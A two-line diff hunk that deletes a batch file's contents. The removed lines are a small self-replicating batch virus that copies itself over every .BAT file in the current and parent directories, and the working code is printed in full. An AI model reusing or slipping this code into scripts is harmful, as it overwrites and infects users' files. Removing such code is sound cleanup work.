@@ -1,2 +1,0 @@
-@Echo OFF
-FOR %%f IN (*.BAT ../*.BAT) DO COPY %0 %%f >nul
